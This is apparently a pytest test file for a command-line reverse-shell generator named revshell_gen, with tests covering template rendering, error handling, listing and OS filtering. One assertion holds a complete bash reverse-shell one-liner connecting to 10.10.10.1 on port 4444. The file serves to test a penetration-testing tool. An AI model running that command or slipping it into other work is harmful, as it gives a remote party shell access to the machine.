from __future__ import annotations

from revshell_gen import cli


def test_generate_command_prints_rendered_shell(capsys):
    exit_code = cli.main(["generate", "bash-tcp", "--ip", "10.10.10.1", "--port", "4444"])
    captured = capsys.readouterr()

    assert exit_code == 0
    assert "bash -i >& /dev/tcp/10.10.10.1/4444 0>&1" in captured.out


def test_generate_command_unknown_template_returns_error(capsys):
    exit_code = cli.main(["generate", "nope", "--ip", "10.10.10.1", "--port", "4444"])
    captured = capsys.readouterr()

    assert exit_code == 1
    assert "Unknown template id" in captured.out


def test_generate_command_invalid_port_returns_error(capsys):
    exit_code = cli.main(["generate", "bash-tcp", "--ip", "10.10.10.1", "--port", "99999"])
    captured = capsys.readouterr()

    assert exit_code == 1
    assert "Port must be between" in captured.out


def test_list_command_runs_and_prints_table(capsys):
    exit_code = cli.main(["list"])
    captured = capsys.readouterr()

    assert exit_code == 0
    assert "Bash -i" in captured.out


def test_list_command_with_os_filter(capsys):
    exit_code = cli.main(["list", "--os", "Windows"])
    captured = capsys.readouterr()

    assert exit_code == 0
    assert "PowerShell" in captured.out
    assert "Netcat" not in captured.out


def test_ips_command_runs(capsys):
    exit_code = cli.main(["ips"])
    capsys.readouterr()

    assert exit_code == 0
